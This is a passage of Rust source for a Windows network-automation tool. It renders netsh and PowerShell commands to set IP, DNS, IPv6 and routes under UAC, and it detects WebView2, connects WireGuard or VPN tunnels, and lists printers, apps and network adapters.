    // 空网关必须直接判否：否则空 token 会让每一行都命中
    !ip.is_empty()
        && line
            .split(|c: char| !c.is_ascii_digit() && c != '.')
            .any(|tok| tok == ip)
}

/// 带 TTL 的状态快照（避免一次身份解析触发多次 PowerShell 启动）。
fn status_cached() -> InterfaceStatus {
    let mut c = cache().lock().unwrap_or_else(|e| e.into_inner());
    if let Some((t, st)) = c.as_ref() {
        if t.elapsed() < CACHE_TTL {
            return st.clone();
        }
    }
    let st = read_status();
    *c = Some((Instant::now(), st.clone()));
    st
}

fn invalidate_cache() {
    *cache().lock().unwrap_or_else(|e| e.into_inner()) = None;
}

// —————————————————————————— 写入：结构化操作 ——————————————————————————

/// 结构化特权操作（Windows 版）。渲染成 PowerShell 脚本后经 UAC 执行。
#[derive(Debug, PartialEq, Eq)]
enum WinOp {
    SetDhcp { iface: String },
    SetManual {
        iface: String,
        ip: String,
        mask: String,
        gw: String,
    },
    SetDns {
        iface: String,
        servers: Vec<String>,
    },
    SetV6Off { iface: String },
    SetV6Auto { iface: String },
    SetV6Manual {
        iface: String,
        addr: String,
        prefix: String,
        gw: String,
    },
    RouteAdd {
        iface: String,
        dest: String,
        gw: Option<String>,
        metric: u32,
    },
    RouteDelete { dest: String },
}

impl WinOp {
    fn render(&self) -> String {
        match self {
            WinOp::SetDhcp { iface } => netsh_line(&[
                "interface",
                "ipv4",
                "set",
                "address",
                &format!("name={}", iface),
                "source=dhcp",
            ]),
            WinOp::SetManual {
                iface,
                ip,
                mask,
                gw,
            } => netsh_line(&[
                "interface",
                "ipv4",
                "set",
                "address",
                &format!("name={}", iface),
                "static",
                ip,
                mask,
                gw,
            ]),
            WinOp::SetDns { iface, servers } => {
                let n = format!("name={}", iface);
                if servers.is_empty() {
                    netsh_line(&["interface", "ipv4", "set", "dnsservers", &n, "source=dhcp"])
                } else {
                    let mut s = netsh_line(&[
                        "interface", "ipv4", "set", "dnsservers", &n, "static", &servers[0],
                        "primary",
                    ]);
                    for (i, sv) in servers.iter().enumerate().skip(1) {
                        s.push_str(&netsh_line(&[
                            "interface",
                            "ipv4",
                            "add",
                            "dnsservers",
                            &n,
                            sv,
                            &format!("index={}", i + 1),
                        ]));
                    }
                    s
                }
            }
            // 关闭 IPv6：禁用适配器上的 ms_tcpip6 绑定（等价于"关掉 IPv6"）
            WinOp::SetV6Off { iface } => format!(
                "Disable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction Stop;",
                psq(iface)
            ),
            WinOp::SetV6Auto { iface } => format!(
                "Enable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction Stop;\
                 Set-NetIPInterface -InterfaceAlias {} -AddressFamily IPv6 -Dhcp Enabled -ErrorAction Stop;",
                psq(iface),
                psq(iface)
            ),
            WinOp::SetV6Manual {
                iface,
                addr,
                prefix,
                gw,
            } => format!(
                "Get-NetIPAddress -InterfaceAlias {} -AddressFamily IPv6 -ErrorAction SilentlyContinue \
                   | Where-Object {{ $_.PrefixOrigin -ne 'WellKnown' }} | Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue;\
                 Enable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue;\
                 New-NetIPAddress -InterfaceAlias {} -IPAddress {} -PrefixLength {} -DefaultGateway {} -ErrorAction Stop | Out-Null;",
                psq(iface),
                psq(iface),
                 psq(iface),
                 psq(addr),
                 psq(prefix),
                 psq(gw)
            ),
            WinOp::RouteAdd {
                iface,
                dest,
                gw,
                metric,
            } => {
                // 先删同名路由，避免重复添加报错（幂等）
                let mut s = format!(
                    "Remove-NetRoute -DestinationPrefix {} -Confirm:$false -ErrorAction SilentlyContinue;",
                    psq(dest)
                );
                let next_hop = match gw {
                    Some(g) if !g.is_empty() => format!(" -NextHop {}", psq(g)),
                    _ => String::new(),
                };
                s.push_str(&format!(
                    "New-NetRoute -DestinationPrefix {} -InterfaceAlias {}{} -RouteMetric {} -ErrorAction Stop | Out-Null;",
                    psq(dest),
                    psq(iface),
                    next_hop,
                    metric
                ));
                s
            }
            WinOp::RouteDelete { dest } => format!(
                "$r = Get-NetRoute -DestinationPrefix {} -ErrorAction SilentlyContinue;\
                 if ($r) {{ $r | Remove-NetRoute -Confirm:$false -ErrorAction Stop }};",
                psq(dest)
            ),
        }
    }
}

/// 批量执行特权操作（一次 UAC 授权覆盖整批）。
fn exec_ops(ops: &[WinOp]) -> Result<(), String> {
    if ops.is_empty() {
        return Ok(());
    }
    let body: String = ops.iter().map(|o| o.render()).collect::<Vec<_>>().join("\r\n");
    // 优先交给常驻 helper（见 `super::win_helper`）：授权从「每批一次」降到「helper 的一生
    // 只弹一次」—— helper 按登录用户命名、跨应用重启存活，所以正常用法下整个下午都只弹
    // 一次，而不是每启动一次应用弹一次。执行的本就是同一份 PowerShell。够不着 helper 才退回
    // 原来的逐批 `run_elevated_ps`，而且退回的那一刻在日志里留下原因（`win_helper::log_fallback`）。
    // 已是管理员（Direct）时 -Verb RunAs 本就不弹窗，不必多绕一条管道。
    let r = if matches!(priv_channel(), PrivChannel::Prompt) {
        match super::win_helper::run_batch(&body) {
            super::win_helper::Outcome::Done(r) => r,
            super::win_helper::Outcome::Unavailable(reason) => {
                super::win_helper::log_fallback(&reason);
                run_elevated_ps(&body)
            }
        }
    } else {
        run_elevated_ps(&body)
    };
    invalidate_cache();
    r
}

/// 把一份配置编译成按序执行的特权操作，不做任何 I/O。
///
/// DNS 是三态字段：`dns` 缺失就不产生 DNS 操作（网卡上现在挂着什么就继续用什么），
/// `dns: ""` 才渲染成 `set dnsservers … source=dhcp` 这条清空指令。
fn apply_ops(iface: &str, p: &NetworkConfig) -> Result<Vec<WinOp>, String> {
    let mut ops: Vec<WinOp> = Vec::new();
    match p.mode {
        Mode::Manual => {
            let ip = p
                .ip
                .clone()
                .ok_or_else(|| i18n::tf("pal.manual_missing", &[("field", "ip")]))?;
            let mask = p
                .netmask
                .clone()
                .ok_or_else(|| i18n::tf("pal.manual_missing", &[("field", "netmask")]))?;
            let gw = p
                .gateway
                .clone()
                .ok_or_else(|| i18n::tf("pal.manual_missing", &[("field", "gateway")]))?;
            ops.push(WinOp::SetManual {
                iface: iface.to_string(),
                ip,
                mask,
                gw,
            });
        }
        Mode::Dhcp => ops.push(WinOp::SetDhcp {
            iface: iface.to_string(),
        }),
    }
    if let Some(dns) = p.dns.as_deref() {
        let servers: Vec<String> = dns
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        ops.push(WinOp::SetDns {
            iface: iface.to_string(),
            servers,
        });
    }
    match p.v6mode {
        Some(V6Mode::Off) => ops.push(WinOp::SetV6Off {
            iface: iface.to_string(),
        }),
        Some(V6Mode::Automatic) => ops.push(WinOp::SetV6Auto {
            iface: iface.to_string(),
        }),
        Some(V6Mode::Manual) => {
            let addr = p
                .ipv6
                .clone()
                .ok_or_else(|| i18n::tf("pal.v6_manual_missing", &[("field", "ipv6")]))?;
            let raw = p
                .v6prefix
                .clone()
                .ok_or_else(|| i18n::tf("pal.v6_manual_missing", &[("field", "v6prefix")]))?;
            let prefix = parse_prefix_len(&raw)?;
            let gw = p
                .v6gateway
                .clone()
                .ok_or_else(|| i18n::tf("pal.v6_manual_missing", &[("field", "v6gateway")]))?;
            ops.push(WinOp::SetV6Manual {
                iface: iface.to_string(),
                addr,
                prefix,
                gw,
            });
        }
        None => {}
    }
    Ok(ops)
}

// —————————————————————————— WebView2 运行时 ——————————————————————————

/// WebView2 运行时是否已安装。
///
/// 判据（任一命中即视为已安装）：
///   1. 磁盘上存在 `msedgewebview2.exe`。Evergreen 运行时的标准安装位置是
///      per-machine `C:\Program Files (x86)\Microsoft\EdgeWebView\Application\<版本>\`，
///      per-user `%LOCALAPPDATA%\Microsoft\EdgeWebView\Application\<版本>\`；
///   2. 注册表 `Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}`
///      下存在 `pv` 值（HKLM 的 WOW6432Node 视图 + HKCU 各查一次）。
///
/// 为什么自己判：安装包把 `bundle.windows.webviewInstallMode` 设为 `skip`（不再内嵌
/// 完整的 WebView2 运行时，setup.exe 从 ~218MB 降到几 MB）。代价是**必须**在本机缺少
/// 运行时时给用户一个可操作的提示 —— 否则 Tauri 创建 WebView 失败，进程静默退出，
/// 用户只会看到「装完打不开」。这里正是那个提示的判据。
///
/// 磁盘检查放在前面：它不需要拉起子进程，绝大多数机器上第一次就命中。
pub fn webview2_available() -> bool {
    if webview2_on_disk() {
        return true;
    }
    // 注册表兜底（覆盖运行时被装到非标准路径、或只写了注册表的情况）。
    // 用 reg.exe 而不是 winreg FFI：零依赖，且 reg 的退出码就是现成的存在性判据。
    const SUBKEY: &str = r"Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}";
    let hklm = format!(r"SOFTWARE\WOW6432Node\{}", SUBKEY);
    let hkcu = format!(r"SOFTWARE\{}", SUBKEY);
    run("reg", &["query", &hklm, "/v", "pv"]).is_ok()
        || run("reg", &["query", &hkcu, "/v", "pv"]).is_ok()
}

/// 在 Evergreen 运行时的标准安装位置下找 `msedgewebview2.exe`。
fn webview2_on_disk() -> bool {
    let mut roots: Vec<std::path::PathBuf> = Vec::new();
    for var in ["ProgramFiles(x86)", "ProgramFiles", "LOCALAPPDATA"] {
        if let Some(base) = std::env::var_os(var) {
            roots.push(
                std::path::PathBuf::from(base)
                    .join("Microsoft")
                    .join("EdgeWebView")
                    .join("Application"),
            );
        }
    }
    for root in roots {
        // 目录不存在（未安装）是正常情况，直接跳过
        let Ok(entries) = std::fs::read_dir(&root) else {
            continue;
        };
        for e in entries.flatten() {
            if e.path().join("msedgewebview2.exe").is_file() {
                return true;
            }
        }
    }
    false
}

// —————————————————————————— Windows 实现 ——————————————————————————

/// 无状态：`Copy` 让它可以按值传给后台线程（健康度监测）而不必套 `Arc`。
#[derive(Debug, Clone, Copy)]
pub struct WindowsPlatform;

/// 一块网卡适配器的匹配结果。
struct WinAdapter {
    /// `Get-NetAdapter` 的 `Status` 为 `Up`
    up: bool,
    /// 厂商提示是否落在这块适配器的描述里
    provider_matched: bool,
    name: String,
    desc: String,
}

/// 切 `name|status|description` 行。描述里可以有 `|`（`splitn` 保住整段描述），
/// 名字段为空则整行丢弃（PowerShell 出错时习惯输出空行）。
fn parse_adapter_lines(out: &str) -> Vec<(String, String, String)> {
    out.lines()
        .filter_map(|l| {
            let mut it = l.splitn(3, '|');
            let name = it.next()?.trim().to_string();
            let status = it.next()?.trim().to_string();
            let desc = it.next().unwrap_or("").trim().to_string();
            (!name.is_empty()).then_some((name, status, desc))
        })
        .collect()
}

/// 一次 PowerShell 取回全部适配器（名字 / 状态 / 描述），在 Rust 侧做匹配。
///
/// 为什么不在 PowerShell 里 `Where-Object { $_.Name -eq <目标> }`：那样「找不到」和
/// 「命令本身失败」都会退化成空输出，而这两件事对用户的意义完全相反
/// （前者是配置写错了名字，后者是这台机器上 PowerShell 用不了）。
fn win_adapters() -> Vec<(String, String, String)> {
    let script = "$ErrorActionPreference='SilentlyContinue';\
Get-NetAdapter | ForEach-Object { $_.Name + '|' + $_.Status + '|' + $_.InterfaceDescription }";
    parse_adapter_lines(&ps(script).unwrap_or_default())
}

/// 目标隧道对应的适配器。`None` = 这台机器上没有这块网卡。
///
/// Windows 上两类隧道都表现为「一块网卡」：WireGuard 建的适配器名就是隧道名，
/// VPN 拨号连接同理，所以两种 `TunnelTarget` 的检测不必分叉。
fn win_adapter(target: &TunnelTarget) -> Option<WinAdapter> {
    let adapters = win_adapters();
    let by_name = |name: &str| super::tunnel_name_eq(name, target.name());
    let hit = adapters
        .iter()
        .find(|(name, _, desc)| by_name(name) && super::provider_in(target.provider(), desc))
        .or_else(|| adapters.iter().find(|(name, _, _)| by_name(name)))?;
    Some(WinAdapter {
        up: hit.1.eq_ignore_ascii_case("up"),
        provider_matched: super::provider_in(target.provider(), &hit.2),
        name: hit.0.clone(),
        desc: hit.2.clone(),
    })
}

/// 这台机器上 WireGuard 的隧道配置目录（`%PROGRAMDATA%\WireGuard\WiredTunnels`）。
fn wireguard_conf_dir() -> Option<std::path::PathBuf> {
    let base = std::env::var_os("PROGRAMDATA")?;
    Some(std::path::Path::new(&base).join("WireGuard").join("WiredTunnels"))
}

/// WireGuard 官方命令行入口。装在其他位置时退化为 PATH 上的 `wireguard.exe`。
fn wireguard_exe() -> String {
    for cand in [
        std::env::var("PROGRAMFILES")
            .map(|p| format!("{}\\WireGuard\\wireguard.exe", p))
            .unwrap_or_default(),
        std::env::var("PROGRAMFILES(X86)")
            .map(|p| format!("{}\\WireGuard\\wireguard.exe", p))
            .unwrap_or_default(),
    ] {
        if !cand.is_empty() && std::path::Path::new(&cand).exists() {
            return cand;
        }
    }
    "wireguard.exe".to_string()
}

/// 已安装的 WireGuard 隧道名（`.conf` 文件名），给「找不到隧道」的报错用。
fn wireguard_tunnel_names() -> Vec<String> {
    let Some(dir) = wireguard_conf_dir() else {
        return Vec::new();
    };
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return Vec::new();
    };
    rd.flatten()
        .filter_map(|e| {
            let p = e.path();
            (p.extension().and_then(|x| x.to_str()) == Some("conf"))
                .then(|| p.file_stem().map(|s| s.to_string_lossy().to_string()))
                .flatten()
        })
        .collect()
}

/// 隧道名会被拼成配置文件名，所以路径分隔符与 `..` 一律拒绝。
///
/// 用户在这里写的是**隧道名**，任何场合都不需要它们；放过一个 `..\..\x` 就等于让
/// 一份 config.json 能指名安装 `%PROGRAMDATA%` 之外的任意 `.conf`。
fn safe_tunnel_name(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err(i18n::t("pal.tunnel_name_empty"));
    }
    if name
        .chars()
        .any(|c| c == '/' || c == '\\' || c == ':' || c < ' ')
        || name.contains("..")
    {
        return Err(i18n::tf("pal.tunnel_name_invalid", &[("name", name)]));
    }
    Ok(())
}

/// 安装并启动一条 WireGuard 隧道服务。
///
/// ⚠️ `wireguard.exe /installtunnelservice` 需要管理员权限；这里**不**走 UAC 通道
/// （worker 会反复调用，弹窗就成了每 N 秒一次的骚扰），失败即把系统原话报出去。
/// 另一个已知行为：该命令在某些版本会顺带拉起托盘界面而不立即退出 —— 这不会卡住
/// worker，一次 tick 有自己的等待上限（见 `automation::persistent`）。
fn connect_wireguard(tunnel: &str) -> Result<(), String> {
    safe_tunnel_name(tunnel)?;
    let dir = wireguard_conf_dir().ok_or_else(|| i18n::t("pal.no_programdata"))?;
    let conf = dir.join(format!("{}.conf", tunnel));
    if !conf.is_file() {
        let known = wireguard_tunnel_names();
        let dir_s = dir.display().to_string();
        return Err(if known.is_empty() {
            i18n::tf("pal.wg_dir_empty", &[("dir", &dir_s), ("name", tunnel)])
        } else {
            i18n::tf(
                "pal.wg_conf_missing",
                &[("name", tunnel), ("existing", &known.join(", "))],
            )
        });
    }
    let exe = wireguard_exe();
    let conf_s = conf.to_string_lossy().to_string();
    run(&exe, &["/installtunnelservice", &conf_s])
        .map(|_| ())
        .map_err(|e| {
            i18n::tf(
                "pal.wg_install_failed",
                &[("exe", &exe), ("conf", &conf_s), ("error", &e)],
            )
        })
}

/// 拨一条已存好的电话簿/VPN 连接（凭据已保存时全程无需交互）。
fn rasdial(entry: &str) -> Result<(), String> {
    run("rasdial", &[entry]).map(|_| ()).map_err(|e| {
        i18n::tf("pal.rasdial_failed", &[("entry", entry), ("error", &e)])
    })
}

// —————————————————————————— 打印机（3B1 set_default_printer） ——————————————————————————

/// 「这台机器有哪些打印机」，一台一行，`名字<TAB>True|False<TAB>备注<TAB>位置`。
///
/// 走 CIM 的 `Win32_Printer` 而不是 `Get-Printer`：本文件的读取一律走 CIM 对象
/// （语言无关、编码可控，见模块头），而 `Default` 标志本来就在这张表上，不需要再问一次。
/// 后两列只是给界面看的说明（`Comment`/`Location`），下发时仍然只用第一列。
///
/// 出错时**必须**留话：这一版之前脚本挂着 `SilentlyContinue`，Rust 侧又是
/// `.unwrap_or_default()`，于是「CIM 查询失败」和「这台机器没有打印机」在界面上长成
/// 同一个空下拉，谁也没法知道是哪一种。现在失败走 stderr + 退出码 1，由
/// [`WindowsPlatform::list_printers`] 记进日志（清单为空仍然按用户之前的决策只说
/// 「没有候选，请手输」，不弹框 —— 弹框是给自动化配置用的，不是给一次下拉刷新用的）。
const PRINTER_ROWS_PS: &str = r#"$ErrorActionPreference='Stop';
try {
$rows = @(Get-CimInstance -ClassName Win32_Printer | ForEach-Object { "$($_.Name)`t$($_.Default)`t$($_.Comment)`t$($_.Location)" })
} catch {
[Console]::Error.Write($_.Exception.Message); exit 1
}
[Console]::Out.Write(($rows -join "`n"))"#;

/// 解析 [`PRINTER_ROWS_PS`] 的行。名字为空的行丢掉 —— 那是 CIM 里没填名字的条目，
/// 选中它只会让下一次下发拿空串去找打印机。
///
/// 认一条打印机的凭据是**第二列必须是 CIM 打出来的 `True`/`False`**：报错文本、进度条
/// 之类的杂行没有这个形状，于是进不了清单（宁可少一台，不要把一句英文变成候选）。
/// 备注与位置里真出现制表符时，多出来的列一起并进标签 —— 标签只是给人看的，
/// 下发用的永远是第一列。
fn parse_printer_rows(out: &str) -> Vec<PrinterInfo> {
    out.lines()
        .filter_map(|l| {
            let mut it = l.split('\t');
            let name = it.next()?.trim();
            if name.is_empty() {
                return None;
            }
            let flag = it.next()?;
            let is_default = if flag.eq_ignore_ascii_case("True") {
                true
            } else if flag.eq_ignore_ascii_case("False") {
                false
            } else {
                return None;
            };
            // 按**列位**取值，空列不许消失：备注为空的行一旦把空列滤掉，位置就会
            // 顶上备注的位置，界面上 `前台`（Location）成了打印机的名字 ——
            // v1.0.1 用户报的「位置伪装成名字」就是这么来的。
            let mut rest = it.map(|s| s.trim());
            let comment = rest.next().unwrap_or("");
            let location = rest.collect::<Vec<_>>().join(" ");
            Some(PrinterInfo {
                name: name.to_string(),
                info: printer_label(name, comment, &location),
                is_default,
            })
        })
        .collect()
}

/// 「把 printer 设为当前用户的默认打印机」的脚本。
///
/// 名字只进 `$want` 这**一个**单引号字面量（[`psq`] 把内部的 `'` 翻倍），比较放在
/// `Where-Object` 里做。刻意不用 WQL 的 `-Filter "Name='…'"`：那是在双引号里再闭合
/// 一层单引号，多一处语法边界就多一类写错闭合的可能，而在对象上比名字没有任何代价。
///
/// 找不到那台打印机、以及 `SetDefaultPrinter` 返回非 0，都用**非 0 退出码**说话 ——
/// `ps()` 据此把系统原话变成界面上的错误，而不是「动作记成功、打印机没变」。
fn set_default_printer_script(printer: &str) -> String {
    format!(
        "$ErrorActionPreference='Stop'; \
         $want={w}; \
         $p=@(Get-CimInstance -ClassName Win32_Printer | Where-Object {{ $_.Name -eq $want }}); \
         if ($p.Count -eq 0) {{ Write-Error \"no printer named $want\"; exit 3 }} \
         $r=$p[0] | Invoke-CimMethod -MethodName SetDefaultPrinter; \
         if ($r.ReturnValue -ne 0) {{ Write-Error \"SetDefaultPrinter returned $($r.ReturnValue)\"; exit 4 }}",
        w = psq(printer)
    )
}

// —————————————————————————— 启动程序（3B launch_app 的候选） ——————————————————————————

/// 「这台机器装着哪些能启动的程序」，一条一个 JSON 对象 `{name, path}`。
///
/// 只扫**开始菜单**（全机 + 当前用户两份）里的 `.lnk`：每一个快捷方式都是安装器写下的
/// 「给人启动的入口」，名字就是它写在菜单里的那个；而 `Start-Process` 恰好直接受理
/// `.lnk` 的完整路径 —— 枚举出来的形状与要下发的形状是同一个，中间没有翻译。
/// 不扫 `Program Files` 的裸 `.exe`：卸载器、运行时、辅助进程会一起进来，下拉变垃圾场；
/// 那些没登记入口的程序照样可以手输路径或走 [`WindowsPlatform::pick_app`]。
///
/// `Get-ChildItem -Recurse` 对单个目录递归（两个根各自走），`SilentlyContinue` 让某个根
/// 读不动时还有另一个；两个都空才输出 `[]`。
const INSTALLED_APPS_PS: &str = r#"$ErrorActionPreference='SilentlyContinue';
$appDirs=@(
  (Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs'),
  (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs')
);
$appItems=@(foreach ($d in $appDirs) {
  Get-ChildItem -LiteralPath $d -Filter *.lnk -Recurse -ErrorAction SilentlyContinue |
    ForEach-Object { [pscustomobject]@{ name=$_.BaseName; path=$_.FullName } }
});
if ($appItems.Count -eq 0) { '[]' } else { ConvertTo-Json -InputObject $appItems -Compress }"#;

/// 解析 [`INSTALLED_APPS_PS`] 的 JSON。
///
/// 只有一条记录时 PowerShell 会把数组退化成**单个对象**（`parse_ssid_values` 处理的是
/// 同一个坑），两种写法都收。名字或路径为空的行不要：选中它只会让下一次下发拿空串去
/// `Start-Process`。去重与排序交给共用的 [`dedupe_sort_apps`]。
fn parse_installed_apps(raw: &str) -> Vec<AppEntry> {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(raw.trim()) else {
        return Vec::new();
    };
    let items: Vec<&serde_json::Value> = match &v {
        serde_json::Value::Array(a) => a.iter().collect(),
        serde_json::Value::Null => Vec::new(),
        other => vec![other],
    };
    let out: Vec<AppEntry> = items
        .into_iter()
        .filter_map(|x| {
            let name = x.get("name")?.as_str()?.trim();
            let path = x.get("path")?.as_str()?.trim();
            if name.is_empty() || path.is_empty() {
                return None;
            }
            Some(AppEntry {
                name: name.to_string(),
                path: path.to_string(),
            })
        })
        .collect();
    dedupe_sort_apps(out)
}

/// 「挑一个程序」的脚本：系统通用的 `OpenFileDialog`。
///
/// 取消 → 什么都不输出（调用方按 `Ok(None)` 收）；标题与筛选文案都走字典
/// （`pal.pick_app_title` / `pal.pick_app_filter`），两条都经 [`psq`] 进单引号字面量。
/// 筛选里放 `.exe/.lnk/.bat/.cmd`：和下拉的枚举范围一致 —— 选得到的东西，
/// `Start-Process` 与手输走的是同一条下发路径。
fn pick_app_script(title: &str, filter: &str) -> String {
    format!(
        "$ErrorActionPreference='Stop'; \
         Add-Type -AssemblyName System.Windows.Forms; \
         $d = New-Object System.Windows.Forms.OpenFileDialog; \
         $d.Title = {t}; $d.Filter = {f}; $d.CheckFileExists = $true; \
         if ($d.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {{ [Console]::Out.Write($d.FileName) }}",
        t = psq(title),
        f = psq(filter),
    )
}

/// 与 [`ps`] 同一套编码前缀，但显式要求 **STA** 单元：WinForms 的通用对话框要它
/// （`powershell.exe` 5.1 的控制台宿主默认就是 STA，这里钉住是为了不依赖那个默认值）。
fn ps_sta(script: &str) -> Result<String, String> {
    let full = format!(
        "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;$ProgressPreference='SilentlyContinue';\r\n{}",
        script
    );
    run(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-Sta",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &full,
        ],
    )
}

impl NetworkPlatform for WindowsPlatform {
    fn watch_ssid(&self, cb: Box<dyn Fn(Option<String>) + Send + Sync>) -> WatcherHandle {
        poll_ssid_watch(|| WindowsPlatform.get_current_ssid(), cb)
    }

    fn get_current_ssid(&self) -> Option<String> {
        status_cached().ssid
    }

    fn get_status(&self) -> InterfaceStatus {
        status_cached()
    }

    fn fresh_status(&self) -> InterfaceStatus {
        read_status()
    }

    fn apply_network(&self, p: &NetworkConfig) -> Result<(), String> {
        let iface = match p.target.unwrap_or_default() {
            NetworkTarget::Primary => primary_iface().ok_or_else(|| i18n::t("pal.no_primary_iface"))?,
            NetworkTarget::Wifi => wifi_iface().ok_or_else(|| i18n::t("pal.no_wifi_adapter_hint"))?,
            NetworkTarget::Ethernet => ethernet_iface().ok_or_else(|| i18n::t("pal.no_ethernet_adapter"))?,
        };
        exec_ops(&apply_ops(&iface, p)?)
    }

    fn set_dhcp(&self) -> Result<(), String> {
        let iface = wifi_iface().ok_or_else(|| i18n::t("pal.no_wifi_iface"))?;
        exec_ops(&[
            WinOp::SetDhcp {
                iface: iface.clone(),
            },
            WinOp::SetDns {
                iface,
                servers: Vec::new(),
            },
        ])
    }

    /// 按**适配器名**切回 DHCP（netsh 直接用 `name=` 定位，无需额外映射）。
    fn set_dhcp_for(&self, dev: &str) -> Result<(), String> {
        exec_ops(&[
            WinOp::SetDhcp {
                iface: dev.to_string(),
            },
            WinOp::SetDns {
                iface: dev.to_string(),
                servers: Vec::new(),
            },
        ])
    }

    /// 枚举当前在用的全部网卡（一次 PowerShell 取全部字段）。
    ///
    /// Windows 上「VPN 软件名」没有注册表式的公开映射，但 VPN 适配器几乎都会把
    /// 产品名写进 `InterfaceDescription`（"Tailscale Tunnel" / "TAP-Windows Adapter
    /// V9 for OpenVPN" / "Cisco AnyConnect Secure Mobility Client Virtual Miniport
    /// Adapter for Windows x64"），因此用描述文本匹配即可（见 [`super::guess_vpn_app`]）。
    fn list_interfaces(&self) -> Vec<super::NicInfo> {
        super::cached_nics(|| {
            /// 「有哪些网卡、各自现在什么状态」的脚本体。`$vpn`（关键字数组）由下面的
            /// `format!` 从 Rust 侧的同源表拼在最前面。
            ///
            /// 筛选条件是「正在用」或「认得出是 VPN 产品」：一条没连上的隧道也要出现在
            /// 清单上 —— 它的存在本身就是信息（这个软件装了，现在没连），而托盘面板与
            /// 3B2 的「维持连接」动作都要能找到它。之前只留 `Status -eq 'Up'`，于是所有
            /// 没连上的虚拟网卡一起消失了。
            ///
            /// 为什么 VPN 判据要下进 PowerShell、而不是回到 Rust 再筛：一台装过几个 VPN
            /// 客户端的机器上有十几个「未连接的非物理适配器」（WAN Miniport 一家就占满），
            /// 每张都要先问四遍地址/路由/DNS 才被丢掉，而 PowerShell 的启动开销本来就躲
            /// 不掉 —— 拉取之前筛，比拉回来再筛便宜得多。判据也不能在这里抄一份：抄了
            /// 就会有「Rust 说是 VPN、界面没显示」和反过来两种分歧。
            const NIC_ROWS_PS_BODY: &str = r#"$ErrorActionPreference='SilentlyContinue';
$list = New-Object System.Collections.Generic.List[object];
foreach ($n in @(Get-NetAdapter)) {
  $t = ("$($n.InterfaceDescription) $($n.Name)").ToLower();
  $isVpn = @($vpn | Where-Object { $t.Contains($_) }).Count -gt 0;
  if ($n.Status -ne 'Up' -and -not $isVpn) { continue };
  $idx = $n.ifIndex;
  $ip   = Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1;
  $v6   = Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv6 | Where-Object { $_.SuffixOrigin -ne 'Link' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1;
  $rt   = Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv4 -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1;
  $rt6  = Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv6 -DestinationPrefix '::/0' | Sort-Object RouteMetric | Select-Object -First 1;
  $rts  = @(Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv4 | ForEach-Object { $_.DestinationPrefix }) |
          Where-Object { $_ -and $_ -notlike "$($ip.IPAddress)/*" -and $_ -notlike '224.*' -and $_ -notlike '255.*' };
  $dns  = Get-DnsClientServerAddress -InterfaceIndex $idx -AddressFamily IPv4;
  $prof = Get-NetConnectionProfile -InterfaceIndex $idx;
  $list.Add([pscustomobject]@{
    name=$n.Name; desc=$n.InterfaceDescription; mac=$n.MacAddress; media=$n.MediaType; status=$n.Status;
    ip=$ip.IPAddress; prefix=$ip.PrefixLength; v6=$v6.IPAddress; gw=$rt.NextHop; gw6=$rt6.NextHop;
    routes=($rts -join ',');
    dns=(($dns | ForEach-Object { $_.ServerAddresses }) -join ',');
    ssid=$wlanSsid[[string]$prof.Name]; prof=$prof.Name;
  });
};
if ($list.Count -eq 0) { '[]' } else { $list | ConvertTo-Json -Compress }"#;

            let needles: Vec<&str> = super::VPN_APP_TABLE
                .iter()
                .map(|(needle, _)| *needle)
                .collect();
            let script = format!(
                "$vpn={};\n{}\n{}",
                ps_arr(&needles),
                WLAN_SSID_MAP_PS,
                NIC_ROWS_PS_BODY
            );

            let raw = match ps(&script) {
                Ok(o) => o,
                Err(_) => return Vec::new(),
            };
            let Ok(v) = serde_json::from_str::<serde_json::Value>(raw.trim()) else {
                return Vec::new();
            };
            // 单张网卡时 PowerShell 会把数组退化为对象，统一成数组处理
            let rows: Vec<&serde_json::Value> = match &v {
                serde_json::Value::Array(a) => a.iter().collect(),
                other => vec![other],
            };

            // 现连 SSID：这张卡在 netsh 里报了 SSID 就用它（关联状态本身），
            // 否则退回 profile XML 的名字。netsh 起不来（服务停用等）就是空表。
            let ssid_by_mac = match run("netsh", &["wlan", "show", "interfaces"]) {
                Ok(text) => netsh_ssids_by_mac(&text),
                Err(_) => std::collections::BTreeMap::new(),
            };

            let mut out: Vec<super::NicInfo> = rows
                .into_iter()
                .filter_map(|r| nic_from_row(r, &ssid_by_mac))
                .collect();

            let rank = |k: super::NicKind| match k {
                super::NicKind::Wireless => 0,
                super::NicKind::Wired => 1,
                super::NicKind::Vpn => 2,
                super::NicKind::Other => 3,
            };
            out.sort_by(|a, b| rank(a.kind).cmp(&rank(b.kind)).then_with(|| a.name.cmp(&b.name)));
            out
        })
    }

    /// 本机装着的网卡（含现在没插线的物理口），供编辑器的接口条件下拉。
    ///
    /// 集合要和 `network_interface` 条件**能命中的**那一集对齐：VPN 隧道不在里面
    /// （`NetworkSnapshot::sample` 把它们归进 `tunnels`），下拉里给一个永远不会命中的
    /// 名字比少给一个更糟。剩下的问题只是「未连接的非物理适配器算不算本机网卡」：
    /// `Get-NetAdapter` 会把 WAN Miniport 一家的十几个伪适配器一起端出来，全列出来
